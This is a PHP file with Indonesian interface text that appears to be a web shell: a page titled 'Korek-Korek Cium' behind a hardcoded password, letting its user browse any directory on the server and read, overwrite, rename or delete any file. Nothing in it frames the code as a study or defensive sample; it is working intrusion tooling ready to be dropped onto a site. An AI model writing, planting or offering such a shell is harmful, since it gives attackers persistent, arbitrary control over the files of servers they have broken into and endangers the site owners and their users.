<?php
session_start();
set_time_limit(0);
error_reporting(E_ALL);
ini_set('display_errors', 1);

$kataSandiBenar = 'anjaybisa';

if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if ($_POST['password'] === $kataSandiBenar) {
            $_SESSION['authenticated'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = 'Kata sandi salah. Coba lagi!';
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Masuk</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body class="d-flex justify-content-center align-items-center vh-100" style="background-color: rgb(0, 0, 0); color: #fff !important;">
        <div class="container text-center">
            <h1>Masuk</h1>
            <?php if (isset($error)) { echo "<div class='alert alert-danger'>$error</div>"; } ?>
            <form method="POST">
                <div class="mb-3">
                    <input type="password" name="password" class="form-control" placeholder="Kata Sandi" required>
                </div>
                <button type="submit" class="btn btn-primary">Kongkek</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

$baseDir = realpath(getcwd());
$path = isset($_GET['path']) ? realpath($_GET['path']) : $baseDir;

if ($path === false || !is_dir($path)) {
    $path = $baseDir;
}
if ($path === false || !is_dir($path)) {
    echo "<tr><td colspan='4'>Direktori tidak valid atau tidak ditemukan.</td></tr>";
    $folders = [];
    $files = [];
} else {
    $folders = [];
    $files = [];
    $scandir = scandir($path);
    foreach ($scandir as $item) {
        $fullpath = "$path/$item";
        if (is_dir($fullpath) && $item != '.' && $item != '..') {
            $folders[] = $item;
        } elseif (is_file($fullpath)) {
            $files[] = $item;
        }
    }
}


function getPermissions($file) {
    $perms = fileperms($file);

    switch ($perms & 0xF000) {
        case 0xC000: $info = 's'; break;
        case 0xA000: $info = 'l'; break;
        case 0x8000: $info = '-'; break;
        case 0x6000: $info = 'b'; break;
        case 0x4000: $info = 'd'; break;
        case 0x2000: $info = 'c'; break;
        case 0x1000: $info = 'p'; break;
        default: $info = 'u';
    }

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'], $_POST['target'])) {
    $action = $_POST['action'];
    $targetPath = $_POST['target'];

    switch ($action) {
            case 'delete':
                if (is_file($targetPath)) {
                    if (unlink($targetPath)) {
                        echo json_encode(['status' => 'success', 'message' => 'File berhasil dihapus!']);
                    } else {
                        echo json_encode(['status' => 'error', 'message' => 'Gagal menghapus file!']);
                    }
                } elseif (is_dir($targetPath)) {
                    if (rmdir($targetPath)) {
                        echo json_encode(['status' => 'success', 'message' => 'Folder berhasil dihapus!']);
                    } else {
                        echo json_encode(['status' => 'error', 'message' => 'Gagal menghapus folder!']);
                    }
                } else {
                    echo json_encode(['status' => 'error', 'message' => 'Target tidak valid!']);
                }
                exit;

            case 'edit':
                if (isset($_POST['content'])) {
                    $handle = fopen($targetPath, 'w');
                    if ($handle) {
                        fwrite($handle, $_POST['content']);
                        fclose($handle);
                        echo json_encode(['status' => 'success', 'message' => 'File berhasil diedit!']);
                    } else {
                        echo json_encode(['status' => 'error', 'message' => 'Tidak dapat membuka file untuk menulis!']);
                    }
                } else {
                    if (is_readable($targetPath)) {
                        $handle = fopen($targetPath, 'r');
                        if ($handle) {
                            $content = fread($handle, filesize($targetPath));
                            fclose($handle);
                            echo json_encode(['status' => 'success', 'content' => $content]);
                        } else {
                            echo json_encode(['status' => 'error', 'message' => 'Tidak dapat membuka file!']);
                        }
                    } else {
                        echo json_encode(['status' => 'error', 'message' => 'File tidak dapat dibaca atau tidak ditemukan!']);
                    }
                }
                exit;

            case 'rename':
                if (isset($_POST['new_name'])) {
                    $newPath = dirname($targetPath) . '/' . $_POST['new_name'];
                    if (rename($targetPath, $newPath)) {
                        echo json_encode(['status' => 'success', 'message' => 'Berhasil mengganti nama!']);
                    } else {
                        echo json_encode(['status' => 'error', 'message' => 'Gagal mengganti nama!']);
                    }
                } else {
                    echo json_encode(['status' => 'error', 'message' => 'Nama baru tidak diberikan!']);
                }
                exit;
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Korek-Korek Cium</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
    body {
        background-color: rgb(0, 0, 0);
        color: #fff !important;
        font-family: Arial, sans-serif;
    }

    .table {
        margin: 20px auto;
        width: 90%;
        color: #fff !important;
    }

    .table-striped tbody tr:nth-of-type(odd),
    .table-striped tbody tr:nth-of-type(even) {
        background-color: transparent !important;
    }

    .table-striped tbody tr td {
        color: #fff !important;
    }

    .table-dark {
        background-color: #343a40 !important;
        color: #fff !important;
    }

    .breadcrumb {
        margin-bottom: 20px;
        color: #fff !important;
    }

    .btn {
        margin: 0 5px;
        color: #fff !important;
    }

    .btn-primary {
        background-color: #007bff !important;
        border-color: #007bff !important;
    }

    .btn-danger {
        background-color: #dc3545 !important;
        border-color: #dc3545 !important;
    }

    .btn-warning {
        background-color: #ffc107 !important;
        border-color: #ffc107 !important;
        color: #000 !important;
    }

    .modal textarea {
        width: 100%;
        height: 300px;
        color: #000 !important;
        background-color: #fff !important;
    }
</style>
</head>
<body>
    <div class="container">
        <h1 class="text-center my-4">Korek-Korek Cium</h1>

        <div class="d-flex justify-content-between align-items-center mb-3">
            <div>
                <?php
               
                echo "<p>Current Directory: ";
                $paths = explode('/', trim($path, '/'));
                $currentPath = '';

                foreach ($paths as $index => $folder) {
                    $currentPath .= '/' . $folder;
                    echo "<a href='?path=" . htmlspecialchars($currentPath, ENT_QUOTES, 'UTF-8') . "'>$folder</a>";
                    if ($index < count($paths) - 1) {
                        echo " / ";
                    }
                }

               
                echo " <a href='?path=" . htmlspecialchars($baseDir, ENT_QUOTES, 'UTF-8') . "' class='btn btn-sm btn-primary'>[Home]</a>";
                echo "</p>";
                ?>
            </div>
        </div>

        <table class="table table-striped">
            <thead class="table-dark">
                <tr>
                    <th>Nama</th>
                    <th>Ukuran</th>
                    <th>Izin</th>
                    <th>Aksi</th>
                </tr>
            </thead>
            <tbody>
              <?php
                $parentPath = dirname($path);
                if ($parentPath && realpath($parentPath) !== realpath($path)) {
                    echo "<tr>
                        <td><a href='?path=" . htmlspecialchars($parentPath, ENT_QUOTES, 'UTF-8') . "'>Kembali ke " . basename($parentPath) . "</a></td>
                        <td>--</td>
                        <td>--</td>
                        <td>--</td>
                    </tr>";
                }
                
               
                $folders = [];
                $files = [];
                $scandir = scandir($path);
                foreach ($scandir as $item) {
                    $fullpath = "$path/$item";
                    if (is_dir($fullpath) && $item != '.' && $item != '..') {
                        $folders[] = $item;
                    } elseif (is_file($fullpath)) {
                        $files[] = $item;
                    }
                }
                
               
                foreach ($folders as $folder) {
                    $fullpath = rtrim($path, '/') . '/' . $folder;
                    echo "<tr>
                        <td><a href='?path=" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "'>$folder</a></td>
                        <td>--</td>
                        <td>" . getPermissions($fullpath) . "</td>
                        <td>
                            <button class='btn btn-warning btn-sm rename-btn' data-path='" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "'>Rename</button>
                            <button class='btn btn-danger btn-sm delete-btn' data-path='" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "'>Hapus</button>
                        </td>
                    </tr>";
                }
                
               
                foreach ($files as $file) {
                    $fullpath = "$path/$file";
                    $size = round(filesize($fullpath) / 1024, 2) . ' KB';
                    echo "<tr>
                        <td>$file</td>
                        <td>$size</td>
                        <td>" . getPermissions($fullpath) . "</td>
                        <td>
                            <button class='btn btn-primary btn-sm edit-btn' data-path='" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "'>Edit</button>
                            <button class='btn btn-warning btn-sm rename-btn' data-path='" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "'>Rename</button>
                            <button class='btn btn-danger btn-sm delete-btn' data-path='" . htmlspecialchars($fullpath, ENT_QUOTES, 'UTF-8') . "'>Hapus</button>
                        </td>
                    </tr>";
                }
                
                ?>
            </tbody>
        </table>
    </div>

    <div class="modal fade" id="editModal" tabindex="-1" aria-labelledby="editModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="editModalLabel">Edit File</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <textarea id="fileContent" class="form-control" rows="10"></textarea>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Tutup</button>
                    <button type="button" class="btn btn-primary save-changes-btn">Simpan Perubahan</button>
                </div>
            </div>
        </div>
    </div>
    <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="renameModalLabel">Ganti Nama</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <input type="text" id="newName" class="form-control" placeholder="Masukkan nama baru">
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Tutup</button>
                <button type="button" class="btn btn-primary save-rename-btn">Simpan</button>
            </div>
            </div>
        </div>
    </div>

    <script>

    $(".save-folder-btn").click(function () {
        const folderName = $("#newFolderName").val();
        if (folderName.trim() === "") {
            alert("Nama folder tidak boleh kosong!");
            return;
        }
        $.post("", { action: "create_folder", name: folderName, path: "<?php echo $path; ?>" }, function (response) {
            const res = JSON.parse(response);
            if (res.status === "success") {
                alert(res.message);
                $("#createFolderModal").modal("hide");
                location.reload();
            } else {
                alert(res.message);
            }
        });
    });

    $(document).on("click", ".delete-btn", function () {
        const path = $(this).data("path");
        if (confirm("Apakah Anda yakin ingin menghapus ini?")) {
            $.post("", { action: "delete", target: path }, function (response) {
                const res = JSON.parse(response);
                if (res.status === "success") {
                    alert(res.message);
                    location.reload();
                } else {
                    alert(res.message);
                }
            });
        }
    });

    $(document).on("click", ".edit-btn", function () {
        const path = $(this).data("path");
        $.post("", { action: "edit", target: path }, function (response) {
            const res = JSON.parse(response);
            if (res.status === "success") {
                $("#fileContent").val(res.content);
                $(".save-changes-btn").data("path", path);
                $("#editModal").modal("show");
            } else {
                alert(res.message);
            }
        });
    });

    $(".save-changes-btn").click(function () {
        const path = $(this).data("path");
        const content = $("#fileContent").val();
        $.post("", { action: "edit", target: path, content: content }, function (response) {
            const res = JSON.parse(response);
            if (res.status === "success") {
                alert(res.message);
                $("#editModal").modal("hide");
                location.reload();
            } else {
                alert(res.message);
            }
        });
    });

    $(document).on("click", ".rename-btn", function () {
    const path = $(this).data("path");
    $("#renameModal").modal("show");
    $(".save-rename-btn").data("path", path);
    });

    $(".save-rename-btn").click(function () {
        const path = $(this).data("path");
        const newName = $("#newName").val();
        if (newName.trim() === "") {
            alert("Nama baru tidak boleh kosong!");
            return;
        }
        $.post("", { action: "rename", target: path, new_name: newName }, function (response) {
            const res = JSON.parse(response);
            if (res.status === "success") {
                alert(res.message);
                $("#renameModal").modal("hide");
                location.reload();
            } else {
                alert(res.message);
            }
        });
    });
</script>
</body>
</html>
